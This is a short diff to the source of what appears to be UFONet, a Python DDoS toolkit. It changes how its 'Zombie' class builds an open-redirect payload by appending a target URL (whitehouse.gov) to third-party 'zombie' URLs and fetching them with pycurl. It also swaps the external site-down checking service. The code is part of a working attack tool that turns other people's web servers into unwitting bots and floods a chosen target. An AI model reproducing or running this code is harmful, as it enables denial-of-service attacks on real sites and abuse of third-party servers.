@@ -11,7 +11,6 @@ Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
 """
 import io, hashlib, re, sys
 import time, threading, random
-import urllib.parse
 from .randomip import RandomIP
 try:
     import pycurl
@@ -52,14 +51,14 @@ class Zombie: # class representing a zombie
                 c.setopt(pycurl.URL, self.zombie.encode('utf-8')) 
             c.setopt(pycurl.NOBODY, 1) # use HEAD
         if self.payload == True:
+            payload = self.zombie + "https://www.whitehouse.gov" # Open Redirect payload [requested by all UFONet motherships ;-)]
             try:
-                payload = self.zombie + "https://www.whitehouse.gov" # Open Redirect payload [requested by all UFONet motherships ;-)]
+                c.setopt(pycurl.URL, payload) # set 'self.zombie' payload
             except:
-                payload = self.zombie.encode('utf-8') + "https://www.whitehouse.gov"
-            c.setopt(pycurl.URL, payload) # set 'self.zombie' payload
+                c.setopt(pycurl.URL, payload.encode('utf-8'))
             c.setopt(pycurl.NOBODY, 0) # use GET
         if self.ufo.external == True:
-            external_service = "https://downforeveryoneorjustme.com/" # external check
+            external_service = "https://status.ws/" # external check
             if options.target.startswith('https://'): # fixing url prefix
                 options.target = options.target.replace('https://','')
             if options.target.startswith('http://'): # fixing url prefix
